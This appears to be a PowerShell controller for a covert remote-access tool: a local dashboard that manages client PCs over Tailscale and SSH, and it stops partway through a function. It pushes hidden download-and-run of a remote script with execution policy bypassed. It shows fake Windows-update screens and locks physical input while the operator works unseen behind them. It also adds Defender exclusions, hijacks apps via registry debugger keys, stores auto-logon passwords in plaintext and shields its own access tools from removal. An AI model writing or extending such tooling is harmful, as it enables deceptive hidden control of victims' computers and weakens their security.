# ================================================================
#  dashboard.ps1  -  ScreenConnect-style web dashboard (v2)
#  Live status + refresh, name-sync with CONNECT.bat,
#  in-page rename, and Lock screen text/color/image per client.
#  Local + private (127.0.0.1 only).
# ================================================================

$port      = 8760
$setupLink = "https://drive.google.com/uc?export=download&id=1zn0vG-xUl7RSCxTfm-gHjC7NF5I11hqO"   # direct-download link to SETUP-SSH-READY.bat
$login     = 'svc'
$protectedApps = @('tailscale.exe','sshd.exe','ssh.exe','powershell.exe','powershell_ise.exe','pwsh.exe','conhost.exe','rustdesk.exe','winlogon.exe','csrss.exe','services.exe','lsass.exe','smss.exe','wininit.exe','svchost.exe','explorer.exe','dwm.exe','userinit.exe')
$namesFile = "$env:APPDATA\client-names.txt"          # shared with CONNECT.bat
$overrideF = "$env:APPDATA\client-logins.txt"

$tsExe = 'tailscale'
if (Test-Path 'C:\Program Files\Tailscale\tailscale.exe') { $tsExe = 'C:\Program Files\Tailscale\tailscale.exe' }

function Load-Names {
    $h = @{}
    if (Test-Path $namesFile) { Get-Content $namesFile | ForEach-Object { if ($_ -match '^(.+?)=(.+)$') { $h[$matches[1].Trim().ToUpper()] = $matches[2].Trim() } } }
    return $h
}
function Save-Name($key, $name) {
    $h = Load-Names; $h[$key.ToUpper()] = $name
    ($h.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) | Set-Content $namesFile
}
function Login-For($ip) {
    if (Test-Path $overrideF) { foreach ($l in Get-Content $overrideF) { if ($l -match "^\s*$([regex]::Escape($ip))\s*=\s*(.+?)\s*$") { return $matches[1] } } }
    return $login
}

function Get-Clients {
    $names = Load-Names
    $out = @()
    $raw = & $tsExe status --json 2>$null
    if ($raw) {
        try {
            $j = ($raw | Out-String) | ConvertFrom-Json
            foreach ($prop in $j.Peer.PSObject.Properties) {
                $p = $prop.Value
                $ip = @($p.TailscaleIPs | Where-Object { $_ -match '^100\.' })[0]
                if (-not $ip) { continue }
                $chost = $p.HostName
                $online = [bool]$p.Online
                $lastSeen = $null
                if ($p.LastSeen) { try { $lastSeen = ([DateTime]$p.LastSeen).ToString('o') } catch {} }
                $name = if ($names.ContainsKey($chost.ToUpper())) { $names[$chost.ToUpper()] } elseif ($names.ContainsKey($ip)) { $names[$ip] } else { $chost }
                $out += [pscustomobject]@{ ip = $ip; host = $chost; name = $name; online = $online; lastSeen = $lastSeen }
            }
        } catch { $out = @() }
    }
    if ($out.Count -eq 0) {
        $lines = & $tsExe status 2>$null
        $i = 0
        foreach ($l in $lines) {
            if ($l -match '^(100\.\d+\.\d+\.\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s*(.*)$') {
                $ip = $matches[1]; $chost = $matches[2]
                if ($i -eq 0) { $i++; continue }
                $i++
                $online = ($l -notmatch 'offline')
                $name = if ($names.ContainsKey($chost.ToUpper())) { $names[$chost.ToUpper()] } elseif ($names.ContainsKey($ip)) { $names[$ip] } else { $chost }
                $out += [pscustomobject]@{ ip = $ip; host = $chost; name = $name; online = $online; lastSeen = $null }
            }
        }
    }
    return $out
}

function SSH-Run($ip, $cmd) {
    $u = Login-For $ip
    $r = ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=yes "$u@$ip" $cmd 2>&1
    return ($r | Out-String)
}
# Fire-and-forget: send a command over SSH WITHOUT waiting for the reply. Used by every
# button that just triggers something on the client (lock, cover, restart...) so the UI is
# instant instead of blocking 1-3s per SSH connection. Sent $times for reliability.
function SSH-Fire($ip, $cmd, $times = 1) {
    $u = Login-For $ip
    $opts = @('-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=4')
    1..$times | ForEach-Object {
        Start-Process ssh -WindowStyle Hidden -ArgumentList ($opts + @("$u@$ip", $cmd)) -ErrorAction SilentlyContinue
    }
}
function Enc($ps) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps)) }
# Timeout-protected SSH call - used for anything that reads data back from the client
# (scan, blocked-list, block/unblock). A slow or half-dead client can otherwise hang
# the SSH call forever and freeze the whole single-threaded dashboard. Runs the SSH
# call in a background job and kills it if it doesn't answer within $timeoutSec.
# Returns $null on timeout/failure (never throws), so callers can detect it and retry.
function SSH-RunT($ip, $cmd, $timeoutSec = 15) {
    $u = Login-For $ip
    $job = $null
    try {
        $job = Start-Job -ScriptBlock {
            param($u, $ip, $cmd)
            try { & ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=yes "$u@$ip" $cmd 2>&1 | Out-String }
            catch { $null }
        } -ArgumentList $u, $ip, $cmd
        if (Wait-Job $job -Timeout $timeoutSec) {
            return (Receive-Job $job -EA SilentlyContinue)
        } else {
            return $null
        }
    } catch {
        return $null
    } finally {
        if ($job) { Stop-Job $job -EA SilentlyContinue; Remove-Job $job -Force -EA SilentlyContinue }
    }
}

function Upgrade-All {
    $ips = Get-Clients
    $inner = '[Net.ServicePointManager]::SecurityProtocol=''Tls12''; $rp=$env:TEMP+''\ru.ps1''; Invoke-WebRequest ''https://raw.githubusercontent.com/kaal9009/rsupport/main/update.ps1'' -OutFile $rp -UseBasicParsing; Start-Process powershell -WindowStyle Hidden -ArgumentList ''-NoProfile'',''-ExecutionPolicy'',''Bypass'',''-File'',$rp'
    $launcher = "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-EncodedCommand','$(Enc $inner)'"
    $encL = Enc $launcher
    $lines = @(); $ok = 0
    foreach ($c in $ips) {
        if (-not $c.online) { $lines += "$($c.name): offline - will auto-update within 30 min"; continue }
        SSH-Run $c.ip ("powershell -NoProfile -EncodedCommand $encL") | Out-Null
        $ok++; $lines += "$($c.name): upgrade started"
    }
    return "Upgrade pushed to $ok online client(s).`n`n" + ($lines -join "`n")
}

$reportPs = @'
$os=(Get-CimInstance Win32_OperatingSystem).Caption
$cs=Get-CimInstance Win32_ComputerSystem
$ram=[math]::Round($cs.TotalPhysicalMemory/1GB,1)
$d=Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$free=[math]::Round($d.FreeSpace/1GB,1);$tot=[math]::Round($d.Size/1GB,1)
$up=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"$env:COMPUTERNAME`n$os`nRAM ${ram}GB`nC: ${free}/${tot}GB free`nUptime $([int]$up.TotalHours)h"
'@

function Lock-Status($ip) {
    $r = SSH-Run $ip 'powershell -NoProfile -Command "if(Test-Path (Join-Path $env:ProgramData ''RemoteSupport\LOCK.flag'')){''YESLOCK''}else{''NOLOCK''}"'
    if ($r -match 'YESLOCK') { return 'locked' }
    elseif ($r -match 'NOLOCK') { return 'unlocked' }
    else { return 'unknown' }
}
function Get-Lock($ip) {
    $c = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\config.txt'
    $text=''; $color=''; $img=''
    foreach ($l in ($c -split "`n")) {
        if ($l -match '^LOCK_TEXT=(.*)')  { $text  = $matches[1].Trim() }
        if ($l -match '^LOCK_COLOR=(.*)') { $color = $matches[1].Trim() }
        if ($l -match '^LOCK_IMAGE=(.*)') { $img   = $matches[1].Trim() }
    }
    return @{ text=$text; color=$color; image=$img }
}
function Set-Lock($ip, $text, $color, $img) {
    $text  = ($text  -replace "'","" -replace "`r","" -replace "`n"," ").Trim()
    $color = ($color -replace "[^#0-9A-Fa-f]","").Trim()
    $img   = ($img   -replace "'","" -replace "\s","").Trim()
    $rps = @"
`$f='C:\ProgramData\RemoteSupport\config.txt'
`$k=@()
if(Test-Path `$f){ `$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_TEXT=' -and `$_ -notmatch '^LOCK_COLOR=' -and `$_ -notmatch '^LOCK_IMAGE=' -and `$_.Trim() -ne ''}) }
`$k+='LOCK_TEXT=$text'
`$k+='LOCK_COLOR=$color'
`$k+='LOCK_IMAGE=$img'
if(-not (Test-Path (Split-Path `$f))){ New-Item -ItemType Directory -Path (Split-Path `$f) -Force | Out-Null }
Set-Content -Path `$f -Value `$k -Encoding ascii
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $rps)) | Out-Null
    return "Saved. Press Lock to see it."
}
# Save which fake-update style (blue/black) the client should show, into config.txt LOCK_MODE
function Set-LockMode($ip, $mode) {
    $mode = ($mode -replace '[^a-zA-Z]','').ToLower()
    if ($mode -ne 'blue' -and $mode -ne 'black') { $mode = 'black' }
    $rps = @"
`$f='C:\ProgramData\RemoteSupport\config.txt'
`$k=@()
if(Test-Path `$f){ `$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_MODE=' -and `$_.Trim() -ne ''}) }
`$k+='LOCK_MODE=$mode'
if(-not (Test-Path (Split-Path `$f))){ New-Item -ItemType Directory -Path (Split-Path `$f) -Force | Out-Null }
Set-Content -Path `$f -Value `$k -Encoding ascii
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $rps)) | Out-Null
    return $mode
}
# Read back which mode the client currently has (blue/black), plus whether it's locked right now
function Get-LockMode($ip) {
    $c = SSH-Run $ip 'cmd /c type C:\ProgramData\RemoteSupport\config.txt'
    $mode='black'
    foreach ($l in ($c -split "`n")) { if ($l -match '^LOCK_MODE=(.*)') { $mode = $matches[1].Trim().ToLower() } }
    if ($mode -ne 'blue' -and $mode -ne 'black') { $mode='black' }
    return $mode
}

# ---- Work-behind cover: client's real screen shows black/update + physical input
# locked, while you work on a virtual 2nd monitor via RustDesk/AnyDesk. ----
# ON: add ONE virtual monitor, taskbar on all displays for the logged-in user,
#     then write WORKCOVER.flag (the user-session watcher shows the cover).
function Start-WorkCover($ip, $mode) {
    $mode = ($mode -replace '[^a-zA-Z]','').ToLower(); if ($mode -ne 'update') { $mode = 'black' }
    # Just show the cover: write WORKCOVER.flag, the user-session watcher does the rest
    # (shows the cover + locks physical input). The 2nd screen comes from RustDesk's own
    # virtual display (toolbar -> Display -> Virtual display -> +); taskbar-on-all-displays
    # is handled safely by the watcher at logon. Nothing heavy or blocking here.
    $ps = @"
`$fl='C:\ProgramData\RemoteSupport\WORKCOVER.flag'
`$d=Split-Path `$fl; if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null}
if((Test-Path `$fl) -and ((Get-Content `$fl -Raw).Trim().ToLower() -ne '$mode')){ Remove-Item `$fl -Force -EA 0; Start-Sleep -Milliseconds 350 }
Set-Content `$fl '$mode' -Encoding ascii
"@
    # Fire-and-forget: instant, dashboard never blocks.
    SSH-Fire $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
    $script:workCover[$ip] = $mode
    return $mode
}
function Stop-WorkCover($ip) {
    $ps = @"
`$d='C:\ProgramData\RemoteSupport'
Remove-Item (Join-Path `$d 'WORKCOVER.flag') -Force -EA 0
Remove-Item (Join-Path `$d 'workmon.on') -Force -EA 0
"@
    # Fire-and-forget: teardown (remove cover) happens on the client in the background - the
    # dashboard returns instantly. The RustDesk virtual display is unplugged from RustDesk's
    # own toolbar (Display -> Virtual display -> - / Plug out all), not from here.
    SSH-Fire $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
    $script:workCover.Remove($ip)
    return 'off'
}
function Get-WorkCover($ip) {
    $r = SSH-Run $ip 'powershell -NoProfile -Command "$f=''C:\ProgramData\RemoteSupport\WORKCOVER.flag''; if(Test-Path $f){(Get-Content $f -Raw).Trim()}else{''off''}"'
    $m = ($r | Out-String).Trim().ToLower()
    if ($m -ne 'update' -and $m -ne 'black') { $m = 'off' }
    return $m
}

# Push the friendly-name map (HOSTNAME=name) to every online client, so the
# Telegram online/offline alerts show your dashboard names instead of raw hostnames.
function Push-Names {
    $clients = Get-Clients
    $lines = @()
    foreach ($c in $clients) { if ($c.host -and $c.name) { $lines += ($c.host.ToUpper() + '=' + $c.name) } }
    if (-not $lines.Count) { return }
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($lines -join "`n")))
    $ps = @"
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllText((Join-Path `$d 'names.txt'),[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$b64')))
"@
    $enc = Enc $ps
    foreach ($c in $clients) {
        if ($c.online) {
            $u = Login-For $c.ip
            Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$($c.ip)","powershell -NoProfile -EncodedCommand $enc" -EA 0
        }
    }
}

function Set-AutoLogin($ip, $pass) {
    $cu = (SSH-Run $ip 'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystem).UserName"').Trim()
    if (-not $cu) { return "Could not detect the logged-in user. Make sure someone is logged in on that PC." }
    $parts = $cu -split '\\', 2
    if ($parts.Count -eq 2) { $dom = $parts[0]; $usr = $parts[1] } else { $dom = '.'; $usr = $parts[0] }
    $uE = ($usr -replace "'", "''"); $dE = ($dom -replace "'", "''"); $pE = ($pass -replace "'", "''")
    $ps = @"
`$k='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
Set-ItemProperty `$k AutoAdminLogon '1'
Set-ItemProperty `$k DefaultUserName '$uE'
Set-ItemProperty `$k DefaultDomainName '$dE'
Set-ItemProperty `$k DefaultPassword '$pE'
Remove-ItemProperty `$k AutoLogonCount -EA 0
"@
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
    return "Auto-login enabled for $dom\$usr. After the next restart, this PC goes straight to the desktop - no password screen. (If it still asks, the password entered didn't match his account.)"
}
function Clear-AutoLogin($ip) {
    $ps = "Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' AutoAdminLogon '0'; Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' DefaultPassword -EA 0"
    SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
    return "Auto-login turned off. This PC will ask for a password again."
}

function Scan-Apps($ip) {
    # Every step is wrapped so one bad shortcut/registry entry can never abort the whole
    # scan - worst case that one entry is skipped. Always prints valid JSON, even '[]' on
    # total failure, so the dashboard never gets garbage to parse. Also captures each app's
    # uninstall command (Uninstall feature) and caps the list so a huge Programs folder
    # can't make the scan crawl.
    $ps = @'
$out=New-Object System.Collections.ArrayList
try{
  $sh=$null; try{$sh=New-Object -ComObject WScript.Shell}catch{}
  if($sh){
    $paths=@("$env:ProgramData\Microsoft\Windows\Start Menu\Programs","$env:APPDATA\Microsoft\Windows\Start Menu\Programs")
    foreach($p in $paths){ try{ if(Test-Path $p){ Get-ChildItem $p -Recurse -Filter *.lnk -EA SilentlyContinue | ForEach-Object {
      try{ $t=$sh.CreateShortcut($_.FullName).TargetPath; if($t -and $t -match '\.exe$'){ [void]$out.Add([pscustomobject]@{name=$_.BaseName;exe=([IO.Path]::GetFileName($t)).ToLower();uninst=''}) } }catch{}
    } } }catch{} }
  }
}catch{}
try{
  $ukeys=@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*')
  foreach($k in $ukeys){ try{ Get-ItemProperty $k -EA SilentlyContinue | ForEach-Object {
    try{
      if($_.DisplayName){
        $un=''; if($_.QuietUninstallString){$un=$_.QuietUninstallString}elseif($_.UninstallString){$un=$_.UninstallString}
        $found=$false
        if($_.DisplayIcon){
          $ic=($_.DisplayIcon -split ',')[0].Trim('"')
          if($ic -match '\.exe$' -and (Test-Path $ic -EA SilentlyContinue)){ [void]$out.Add([pscustomobject]@{name=$_.DisplayName;exe=([IO.Path]::GetFileName($ic)).ToLower();uninst=$un}); $found=$true }
        }
        if((-not $found) -and $_.InstallLocation -and (Test-Path $_.InstallLocation -EA SilentlyContinue)){
          Get-ChildItem $_.InstallLocation -Filter *.exe -EA SilentlyContinue | Select-Object -First 5 | ForEach-Object { [void]$out.Add([pscustomobject]@{name=$_.BaseName;exe=$_.Name.ToLower();uninst=$un}); $found=$true }
        }
        if((-not $found) -and $un){ [void]$out.Add([pscustomobject]@{name=$_.DisplayName;exe='';uninst=$un}) }
      }
    }catch{}
  } }catch{} }
}catch{}
try{
  $map=@{}
  foreach($a in $out){ if($a.exe){ if(-not $map.ContainsKey($a.exe) -or (-not $map[$a.exe].uninst -and $a.uninst)){ $map[$a.exe]=$a } } }
  $named = @($out | Where-Object { -not $_.exe -and $_.name })
  $final = @($map.Values) + $named
  if($final.Count -gt 400){ $final = $final | Select-Object -First 400 }
  ConvertTo-Json -InputObject $final -Compress
}catch{ '[]' }
'@
    $r = SSH-RunT $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) 25
    if (-not $r) { return $null }
    return $r.Trim()
}
$script:appScanCache = @{}
function Get-AppScan($ip, $force) {
    $now = [DateTime]::UtcNow
    if (-not $force -and $script:appScanCache.ContainsKey($ip)) {
        $c = $script:appScanCache[$ip]
        if (($now - $c.time).TotalSeconds -lt 600) { return $c }
    }
    $rawApps = Scan-Apps $ip
    $uninstMap = @{}
    $appsOut = '[]'
    $failed = $false
    if ($rawApps) {
        try {
            $parsed = @($rawApps | ConvertFrom-Json)
            $clean = @()
            foreach ($a in $parsed) {
                if (-not $a) { continue }
                $exe = ('' + $a.exe).ToLower()
                if ($exe -and $a.uninst) { $uninstMap[$exe] = ('' + $a.uninst) }
                $clean += [pscustomobject]@{ name = $a.name; exe = $exe; un = $(if ($a.uninst) { 1 } else { 0 }) }
            }
            $appsOut = (ConvertTo-Json -InputObject $clean -Compress)
        } catch { $appsOut = '[]' }
    } else {
        $failed = $true
    }
    $blk = Get-Blocked $ip
    if ($blk -eq $null) { $failed = $true; $blk = '[]' }
    $entry = @{ time = $now; apps = $appsOut; blocked = $blk; blockmsg = (Get-BlockMsg $ip); uninstMap = $uninstMap; failed = $failed }
    # Don't cache a failed scan - so the very next try re-scans instead of repeating
    # the same empty result for 10 minutes.
    if (-not $failed) { $script:appScanCache[$ip] = $entry }
    return $entry
}
function Get-Blocked($ip) {
    $ps = @'
$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$b=@()
try{ if(Test-Path $k){ Get-ChildItem $k -EA SilentlyContinue | ForEach-Object { try{ if((Get-ItemProperty $_.PSPath -EA SilentlyContinue).Debugger){ $b+=$_.PSChildName.ToLower() } }catch{} } } }catch{}
ConvertTo-Json -InputObject $b -Compress
'@
    $r = SSH-RunT $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) 12
    if (-not $r) { return $null }
    return $r.Trim()
}
$blockHta = @'
<html><head><title>Blocked</title>
<hta:application id="a" border="thin" caption="yes" showintaskbar="no" scroll="no" sysmenu="yes" maximizebutton="no" minimizebutton="no" innerborder="no" contextmenu="no" selection="no" />
<style>
body{margin:0;font-family:'Segoe UI',Arial,sans-serif;background:#ffffff;overflow:hidden}
.wrap{padding:34px 40px;text-align:center}
.ic{font-size:56px;color:#d13438;line-height:1}
.title{font-size:27px;font-weight:600;color:#c00000;margin:12px 0 16px}
.msg{font-size:20px;color:#1b1b1b;line-height:1.5;margin-bottom:28px}
.btn{font-size:17px;padding:10px 40px;background:#0067c0;color:#fff;border:0;border-radius:5px;cursor:pointer}
</style></head>
<body>
<div class="wrap">
<div class="ic">&#9888;</div>
<div class="title">Access Blocked</div>
<div class="msg" id="m">This app is blocked.</div>
<button class="btn" onclick="window.close()">OK</button>
</div>
<script language="VBScript">
Sub Window_OnLoad
  window.resizeTo 540,360
  window.moveTo (screen.availWidth-540)/2,(screen.availHeight-360)/2
  Dim fso,p,msg
  p="C:\ProgramData\RemoteSupport\block-msg.txt"
  Set fso=CreateObject("Scripting.FileSystemObject")
  If fso.FileExists(p) Then
    msg=fso.OpenTextFile(p,1).ReadAll
    If Len(msg)>0 Then document.getElementById("m").innerText=msg
  End If
End Sub
</script></body></html>
'@
$blockVbsB64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($blockHta))


function Block-App($ip, $exe, $useMsg) {
    $exe = ($exe -replace '[^\w\.\-]', '').ToLower()
    if (-not $exe) { return "bad name" }
    if ($protectedApps -contains $exe) { return "PROTECTED: $exe can't be blocked - it would cut off your own access or break Windows." }
    $base = $exe -replace '\.exe$', ''
    $wsc = ($useMsg -eq $true -or $useMsg -eq 'true')
    $ps = @"
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
try{ Add-MpPreference -ExclusionPath `$d -EA SilentlyContinue } catch {}
try{ Add-MpPreference -ExclusionProcess '$exe' -EA SilentlyContinue } catch {}
try{ Add-MpPreference -ExclusionProcess 'mshta.exe' -EA SilentlyContinue } catch {}
`$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
New-Item `$k -Force | Out-Null
"@
    if ($wsc) { $ps += @"

[IO.File]::WriteAllBytes("`$d\blocked.hta",[Convert]::FromBase64String('$blockVbsB64'))
Set-ItemProperty `$k Debugger 'mshta.exe "C:\ProgramData\RemoteSupport\blocked.hta"'
"@ } else { $ps += @"

Set-ItemProperty `$k Debugger '"%windir%\system32\systray.exe"'
"@ }
    $ps += @"

Stop-Process -Name '$base' -Force -EA 0
taskkill /IM '$exe' /F /T 2>`$null
(Get-ItemProperty `$k -EA 0).Debugger
"@
    $enc = Enc $ps
    $r = $null
    for ($i = 0; $i -lt 3 -and -not $r; $i++) {
        $out = SSH-RunT $ip ('powershell -NoProfile -EncodedCommand ' + $enc) 15
        if ($out) { $r = $out.Trim() }
        if (-not $r) { Start-Sleep -Milliseconds 500 }
    }
    $script:appScanCache.Remove($ip)
    if (-not $r) { return "Could not confirm the block took effect on $exe - the client may be slow/offline right now. Try again in a moment." }
    return "Blocked $exe (and closed it if running)"
}
function Set-BlockMsg($ip, $msg) {
    $has = ($msg -and $msg.Trim())
    $msgB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([string]$msg))
    if ($has) {
        $ps = @"
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
[IO.File]::WriteAllBytes("`$d\blocked.hta",[Convert]::FromBase64String('$blockVbsB64'))
[IO.File]::WriteAllText("`$d\block-msg.txt",[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$msgB64')))
`$dbg='mshta.exe "C:\ProgramData\RemoteSupport\blocked.hta"'
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -EA 0 | ForEach-Object { if((Get-ItemProperty `$_.PSPath -EA 0).Debugger){ Set-ItemProperty `$_.PSPath Debugger `$dbg } }
"@
        SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
        return "Message saved - blocked apps now show it."
    } else {
        $ps = @"
Remove-Item 'C:\ProgramData\RemoteSupport\block-msg.txt' -EA 0
`$dbg='"%windir%\system32\systray.exe"'
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -EA 0 | ForEach-Object { if((Get-ItemProperty `$_.PSPath -EA 0).Debugger){ Set-ItemProperty `$_.PSPath Debugger `$dbg } }
"@
        SSH-Run $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps)) | Out-Null
        return "Message cleared - blocked apps are silent."
    }
}
function Get-BlockMsg($ip) {
    $r = SSH-RunT $ip 'cmd /c type C:\ProgramData\RemoteSupport\block-msg.txt 2>NUL' 8
    if (-not $r) { return '' }
    return ($r.Trim())
}
function Unblock-App($ip, $exe) {
    $exe = ($exe -replace '[^\w\.\-]', '').ToLower()
    if (-not $exe) { return "bad name" }
    $ps = @"
`$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
Remove-Item `$k -Recurse -Force -EA 0
if(Test-Path `$k){'STILL_THERE'}else{'GONE'}
"@
    $enc = Enc $ps
    $r = $null
    for ($i = 0; $i -lt 3 -and $r -ne 'GONE'; $i++) {
        $out = SSH-RunT $ip ('powershell -NoProfile -EncodedCommand ' + $enc) 15
        if ($out) { $r = $out.Trim() }
        if ($r -ne 'GONE') { Start-Sleep -Milliseconds 500 }
    }
    $script:appScanCache.Remove($ip)
    if ($r -ne 'GONE') { return "Could not confirm $exe was unblocked - the client may be slow/offline right now. Try again in a moment." }
    return "Unblocked $exe"
}
function Uninstall-App($ip, $exe) {
    $exe = ($exe -replace '[^\w\.\-]', '').ToLower()
    if (-not $exe) { return "bad name" }
    if ($protectedApps -contains $exe) { return "PROTECTED: $exe can't be uninstalled - it's one of your own access tools." }
    $c = $script:appScanCache[$ip]
    $un = $null
    if ($c -and $c.uninstMap -and $c.uninstMap.ContainsKey($exe)) { $un = $c.uninstMap[$exe] }
    if (-not $un) {
        # cache may be missing/stale - rescan once before giving up
        $null = Get-AppScan $ip $true
        $c = $script:appScanCache[$ip]
        if ($c -and $c.uninstMap -and $c.uninstMap.ContainsKey($exe)) { $un = $c.uninstMap[$exe] }
    }
    if (-not $un) { return "No uninstaller found for $exe - it may not be a properly installed program. Remove it manually from Settings > Apps on that PC." }
    $unB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($un))
    # Write the real uninstall command into a .bat file on the client and launch it, rather
    # than trying to re-quote it ourselves - registry uninstall strings are already in a
    # form meant to run as-is from a command line, and this sidesteps quoting bugs entirely.
    $ps = @"
`$u=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$unB64'))
if(`$u -match '(?i)msiexec' -and `$u -notmatch '(?i)/q'){ `$u = `$u + ' /quiet /norestart' }
`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
`$bat=Join-Path `$d 'uninst_tmp.bat'
Set-Content -Path `$bat -Value ("@echo off`r`n"+`$u) -Encoding ascii
Start-Process `$bat -WindowStyle Hidden
"@
    SSH-Fire $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
    $script:appScanCache.Remove($ip)
    return "Uninstall started for $exe - if it needs confirmation, that'll show on the client's screen."
}
function Blocked-All {
    $out = @()
    foreach ($c in (Get-Clients)) {
        if (-not $c.online) { continue }
        $rawB = Get-Blocked $c.ip
        $raw = if ($rawB) { $rawB.Trim() } else { '' }
        $list = @()
        if ($raw) { try { $p = $raw | ConvertFrom-Json; if ($p -is [string]) { $list = @($p) } else { $list = @($p) } } catch {} }
        if ($list.Count) { $out += [pscustomobject]@{ name = $c.name; ip = $c.ip; blocked = $list } }
    }
    return ($out | ConvertTo-Json -Compress -Depth 5)
}

$script:lockedClients = @{}
$script:workCover = @{}
# clients under a "fake-off + restart in 5 min": keep the black cover fresh only until
# this time, then stop (so the PC reboots clean and doesn't get re-covered after restart).
$script:deadUntil = @{}
# Live-preview cache. The thumbnail JPEG is fetched from the client in a BACKGROUND ssh
# process (never in the request path), so /api/thumb returns instantly from cache and can
# never jam the single-threaded server (which was making buttons take minutes).
$script:thumbCache = @{}
$script:thumbFetch = @{}
function Save-LockState { }
# Keep each locked client's flag FRESH. The front-end pings /api/heartbeat every 3s, so
# this refreshes the flag well within the client's 30s freshness window. When the dashboard
# window is closed (or crashes / loses power), these pings stop, the flag goes stale, and
# every client drops its update screen on its own within ~30s. That's the auto-off on close.
function Heartbeat {
    # A "fake-off" client stops being refreshed once its restart time passes, so it
    # boots clean instead of getting re-covered when it comes back online.
    foreach ($ip in @($script:deadUntil.Keys)) {
        if ((Get-Date) -gt $script:deadUntil[$ip]) {
            $script:deadUntil.Remove($ip)
            $script:lockedClients.Remove($ip)
        }
    }
    foreach ($ip in @($script:lockedClients.Keys)) {
        $u = Login-For $ip
        Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$ip",'cmd /c echo.> C:\ProgramData\RemoteSupport\LOCK.flag' -ErrorAction SilentlyContinue
    }
    # keep each active work-cover fresh; if this dashboard stops (window closed / PC
    # off / crash), the refresh stops and the client drops the cover within ~35s.
    foreach ($ip in @($script:workCover.Keys)) {
        $u = Login-For $ip
        $m = $script:workCover[$ip]
        Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$ip","cmd /c echo $m> C:\ProgramData\RemoteSupport\WORKCOVER.flag" -ErrorAction SilentlyContinue
    }
    return $script:lockedClients.Count
}
# Called when the dashboard is closing: proactively drop every fake-update screen now
# (instant), rather than waiting for the 30s staleness timeout. Also clears any
# work-behind covers so no client is left covered.
function Unlock-All {
    foreach ($ip in @($script:lockedClients.Keys)) {
        $u = Login-For $ip
        Start-Process ssh -WindowStyle Hidden -ArgumentList '-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=5',"$u@$ip",'cmd /c del /f /q C:\ProgramData\RemoteSupport\LOCK.flag' -ErrorAction SilentlyContinue
    }
    foreach ($ip in @($script:workCover.Keys)) {
        try { Stop-WorkCover $ip | Out-Null } catch {}
    }
    $script:lockedClients.Clear()
}

function Do-Action($ip, $action) {
    switch ($action) {
        'upgrade'  {
            $inner = '[Net.ServicePointManager]::SecurityProtocol=''Tls12''; $rp=$env:TEMP+''\ru.ps1''; Invoke-WebRequest ''https://raw.githubusercontent.com/kaal9009/rsupport/main/update.ps1'' -OutFile $rp -UseBasicParsing; Start-Process powershell -WindowStyle Hidden -ArgumentList ''-NoProfile'',''-ExecutionPolicy'',''Bypass'',''-File'',$rp'
